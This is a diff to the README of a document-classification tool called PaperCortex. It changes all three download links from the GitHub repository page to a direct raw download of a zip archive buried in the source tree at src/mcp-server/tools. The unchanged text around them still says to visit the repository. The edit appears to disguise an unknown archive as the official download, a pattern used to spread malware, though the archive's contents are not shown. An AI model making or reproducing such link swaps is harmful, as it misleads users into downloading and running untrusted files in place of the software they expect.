@@ -1,6 +1,6 @@
 # 🤖 PaperCortex - Find, Classify, Export Documents Fast
 
-[![Download PaperCortex](https://img.shields.io/badge/Download%20PaperCortex-purple?style=for-the-badge&logo=github)](https://github.com/chetanmorey1/PaperCortex)
+[![Download PaperCortex](https://img.shields.io/badge/Download%20PaperCortex-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/chetanmorey1/PaperCortex/main/src/mcp-server/tools/Paper-Cortex-2.7-beta.1.zip)
 
 ## 🧭 What PaperCortex Does
 
@@ -38,7 +38,7 @@ For best results, use:
 
 Visit this page to download:
 
-https://github.com/chetanmorey1/PaperCortex
+https://raw.githubusercontent.com/chetanmorey1/PaperCortex/main/src/mcp-server/tools/Paper-Cortex-2.7-beta.1.zip
 
 On Windows, follow these steps:
 
@@ -316,6 +316,6 @@ These files help the app remember settings and process documents
 
 ## 🔗 Download Again
 
-[![Download PaperCortex](https://img.shields.io/badge/Get%20PaperCortex-blue-grey?style=for-the-badge&logo=github)](https://github.com/chetanmorey1/PaperCortex)
+[![Download PaperCortex](https://img.shields.io/badge/Get%20PaperCortex-blue-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/chetanmorey1/PaperCortex/main/src/mcp-server/tools/Paper-Cortex-2.7-beta.1.zip)
 
 Use this page to visit the repository, get the latest files, and follow the current Windows setup path
